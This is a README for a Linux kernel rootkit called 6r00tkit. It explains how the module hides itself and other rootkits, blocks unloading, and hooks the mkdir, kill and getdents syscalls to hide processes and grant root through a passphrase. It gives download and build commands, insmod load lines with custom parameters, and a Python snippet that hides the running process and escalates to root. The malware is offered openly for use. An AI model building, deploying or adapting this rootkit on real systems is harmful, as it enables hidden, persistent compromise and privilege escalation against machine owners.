# 6r00tkit

## Description

6r00tkit (Grootkit) is a rootkit used to hide and protect itself and other rootkits, to hide process and to set root permissions on a process (privilege escalation).

How it's works:
 - Remove itself and other rootkit from the kernel modules list
 - Use itself and other rootkit to block an unload
 - Hooks 4 syscalls
    - `mkdir`, to get the root permissions for any process you may use the passphrase in `mkdir` syscall (default passphrase is `1 4m 6r00t`)
    - `kill`, to get a hidden process you may use the special signal in `kill` syscall (default is `14600` - numbers in `1 4m 6r00t`)
    - `getdents64` to hide process (process directory in `/proc`)
    - `getdents` to hide process (process directory in `/proc`)

## Requirements

 - Linux system
 - Root permissions to load the module

## Build

```bash
wget https://github.com/mauricelambert/6r00tkit/archive/refs/heads/main.zip
unzip main.zip
cd 6r00tkit-main/
make
```

## Load

### Default parameters

```bash
sudo insmod ./rootkit.ko
```

### Add parameters

```bash
sudo insmod ./rootkit.ko modulename="other_rootkit" passphrase="s3cr3t" killcode=666
```

## Usages

You can use it like the following with python (or use it with any program and script, you only need to call specific syscalls with specific values):

```python
from os import mkdir, getuid, kill, listdir, getpid, system

print("PID:", getpid())
print("\n".join(listdir(f"/proc/{getpid()}")))
system("ps aux | grep python")
kill(getpid(), 14600) # i use the default signal, you should use your own signal if added as parameters on load
print("\n".join(listdir(f"/proc/{getpid()}")))
system("ps aux | grep python")

print("Current UID:", getuid())
system("whoiam")
mkdir("1 4m 6r00t") # i use the default passphrase, you should use your own passphrase if added as parameters on load
print("Current UID:", getuid())
system("whoiam")
```

## Licence

Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).